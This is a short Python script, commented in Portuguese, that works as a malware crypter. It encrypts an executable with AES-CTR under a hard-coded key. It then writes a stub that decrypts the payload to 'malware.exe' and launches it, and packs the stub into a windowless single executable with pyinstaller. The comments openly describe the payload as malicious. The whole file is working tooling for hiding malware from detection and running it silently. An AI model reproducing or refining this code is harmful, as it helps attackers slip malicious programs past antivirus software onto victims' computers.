import pyaes
import os
import sys

KEY = b'0123456789123456'


exe_path = sys.argv[1]  #Obtém o caminho do arquivo executável que será criptografado.
name = name = sys.argv[2] #Nome do stub .py

with open(exe_path, 'rb') as file:
    exe = file.read()

crypt = pyaes.AESModeOfOperationCTR(KEY).encrypt(exe) #Criptografar o executável 


#Descriptografar o executável 
#Executar o executável 
stub = f"""
import pyaes
import subprocess

KEY = {KEY}
crypt = {crypt}

decryp = pyaes.AESModeOfOperationCTR(KEY).decrypt(crypt)                    
with open('malware.exe', 'wb') as file:
    file.write(decryp)

subprocess.Popen('malware.exe')
"""
#1. Para descriptografar o decrypt (executável malicioso), é necessário que o pyaes faça a descriptografia.
#2. O subprocess executa o arquivo malware.exe ( malware descriptografado )
#Abre um arquivo em python que irá conter os processos que irão acontecer ( 1  e 2 ). 
with open(name, 'w') as file:
    file.write(stub)
#Vai transformar o stub em um executável. Esse executável quando executado, irá ocorrer os processos 1 e 2.
os.system(f'pyinstaller -F -w --clean {name}')
